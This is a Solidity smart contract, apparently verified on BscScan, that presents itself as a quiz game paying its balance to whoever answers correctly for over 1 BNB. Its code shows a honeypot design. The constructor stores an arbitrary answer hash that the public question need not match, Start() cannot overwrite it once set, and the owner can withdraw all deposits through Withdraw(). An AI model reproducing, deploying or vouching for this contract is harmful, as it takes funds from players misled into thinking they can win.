/**
 *Submitted for verification at BscScan.com on 2022-04-07
*/

pragma solidity ^0.8.7;


contract quiz_game
{

    address public owner;
    string public question;
    bytes32 private answer;

    constructor(address _owner, string memory _questioMalloc, bytes32 _answerMalloc) 
    {
      owner = _owner;
      question = _questioMalloc; //string
      answer = _answerMalloc; //32bytes
    }

    modifier isOwner(){
        require(msg.sender == owner);
        _;
    }

    function Withdraw (address to, uint256 amount) public isOwner {payable(to).transfer(amount);}

    function Start(string memory _question, string memory _answer) public payable isOwner {
        if(answer == 0x0) {
            question = _question;
            answer = keccak256(abi.encodePacked(_answer));
        }
    }

    function Try(string memory _answer) public payable {
        require(msg.sender == tx.origin);
        if(answer == keccak256(abi.encodePacked(_answer)) && msg.value > 1 ether) { // 1 BNB
            payable(msg.sender).transfer(address(this).balance);
        }
    }

    fallback() external {}
  
}